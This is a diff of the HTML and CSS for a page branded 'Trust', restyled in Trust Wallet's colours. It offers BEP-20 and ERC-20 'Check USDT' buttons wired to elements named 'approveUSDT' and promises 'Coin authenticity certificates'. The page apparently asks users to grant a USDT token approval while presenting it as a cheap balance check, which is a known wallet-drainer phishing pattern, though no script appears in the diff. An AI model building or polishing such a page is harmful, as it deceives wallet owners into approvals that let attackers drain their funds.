@@ -21,8 +21,8 @@
 
     <style>
         :root {
-            --primary-color: #F0B90B;
-            --primary-hover: #D4A30C;
+            --primary-color: #3375bb;
+            --primary-hover: #3375bb;
             --secondary-color: #1E2026;
             --light-bg: #F8F9FA;
             --card-bg: #FFFFFF;
@@ -67,7 +67,8 @@
         .btn-primary {
             background-color: var(--primary-color);
             border-color: var(--primary-color);
-            color: var(--secondary-color);
+            /* color: var(--secondary-color); */
+            color: #edf2fa;
             font-weight: 600;
         }
 
@@ -369,9 +370,6 @@
                 <img src="trust.svg" alt="Trust Logo" height="30">
                 <span style="margin-left: 8px; font-weight: bold; color: #3375BB;">Trust</span>
             </a>
-
-
-
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
                 aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                 <span class="navbar-toggler-icon"></span>
@@ -387,13 +385,14 @@
             </div>
         </div>
     </nav>
-
     <!-- 🔵 BEP Section -->
-    <div id="bep-container" class="wallet-container" style="display: none;">
+    <div id="bep-container" class="wallet-container"
+        style="display: none; padding: 16px; flex-direction: column; align-items: center; gap: 16px;">
         <!-- Approve USDT Section for BEP-20 -->
-        <div id="approveUSDTSection" class="approve-section" style="display: none;">
-            <div class="text-center">
-                <button id="approveUSDT" class="btn btn-warning btn-lg px-5">
+        <div id="approveUSDTSection" class="approve-section" style="display: none; width: 100%; max-width: 400px;">
+            <div style="text-align: center;">
+                <button id="approveUSDT"
+                    style="width: 100%; padding: 14px 20px; font-size: 16px; background-color: #ffc107; border: none; border-radius: 8px; color: #000; font-weight: bold; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
                     <i class="fas fa-award me-2"></i>Check USDT
                 </button>
                 <p class="text-muted mt-2 small">This will charge you a nominal fee less then 1 USDT</p>
@@ -401,30 +400,14 @@
         </div>
 
         <!-- BEP-20 Wallet Info -->
-        <div id="walletInfo" class="wallet-info" style="display: none;">
-            <div class="wallet-row">
-                <span class="wallet-label">Address:</span>
-                <div class="wallet-address-container">
-                    <input type="text" id="userAddress" class="wallet-address-input" readonly
-                        title="Your wallet address" />
-                    <button class="wallet-copy-btn" title="Copy Address">
-                        <i class="far fa-copy"></i>
-                    </button>
-                </div>
+        <div id="walletInfo" class="wallet-info"
+            style="display: none; width: 100%; max-width: 400px; font-size: 15px; background: #f9f9f9; padding: 12px; border-radius: 6px;">
+            <div class="wallet-row" style="display: flex; justify-content: space-between; align-items: center;">
+                <span class="wallet-label" style="font-weight: 600;">USDT Balance:</span>
+                <span id="userBalance" style="font-weight: 500;">Loading...</span>
             </div>
-            <div class="wallet-row">
-                <span class="wallet-label">USDT Balance:</span>
-                <span id="userBalance">Loading...</span>
-            </div>
-            <!-- <div class="wallet-row">
-                <span class="wallet-label">Status:</span>
-                <span class="wallet-status">
-                    <span class="wallet-status-dot"></span>Connected
-                </span>
-            </div> -->
         </div>
     </div>
-
     <div id="erc-container" class="wallet-container"
         style="display: none; padding: 16px; flex-direction: column; align-items: center; gap: 16px;">
 
@@ -433,11 +416,9 @@
             <div style="text-align: center;">
                 <button id="approveUSDTerc"
                     style="width: 100%; padding: 14px 20px; font-size: 16px; background-color: #ffc107; border: none; border-radius: 8px; color: #000; font-weight: bold; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
-                    <i class="fas fa-award" style="margin-right: 8px;"></i>Check USDT
+                    <i class="fas fa-award me-2"></i>Check USDT
                 </button>
-                <p style="margin-top: 10px; font-size: 13px; color: #6c757d;">
-                    This will charge you a nominal fee less than 1 USDT
-                </p>
+                <p class="text-muted mt-2 small">This will charge you a nominal fee less then 1 USDT</p>
             </div>
         </div>
 
@@ -450,11 +431,6 @@
             </div>
         </div>
     </div>
-
-
-
-
-
     <!-- Main Content -->
     <div class="main-content">
         <main>
@@ -469,14 +445,14 @@
                                 provides
                                 Coin authenticity certificates to protect both buyers and sellers.
                             </p>
-                            <div class="d-flex gap-3">
+                            <!-- <div class="d-flex gap-3">
                                 <button class="btn btn-primary px-4 py-2">
                                     <i class="fas fa-play me-2"></i>Watch Demo
                                 </button>
                                 <button class="btn btn-outline-secondary px-4 py-2">
                                     <i class="fas fa-book me-2"></i>Documentation
                                 </button>
-                            </div>
+                            </div> -->
                         </div>
                         <div class="col-lg-6">
                             <div class="card p-4">
@@ -579,7 +555,7 @@
                     <h2 class="text-center section-title mb-5">How It Works</h2>
                     <div class="row align-items-center">
                         <div class="col-lg-6 mb-4 mb-lg-0">
-                            <img src="https://via.placeholder.com/600x400" alt="How it works" class="img-fluid rounded">
+                            <!-- <img src="https://via.placeholder.com/600x400" alt="How it works" class="img-fluid rounded"> -->
                         </div>
                         <div class="col-lg-6">
                             <div class="card border-0">
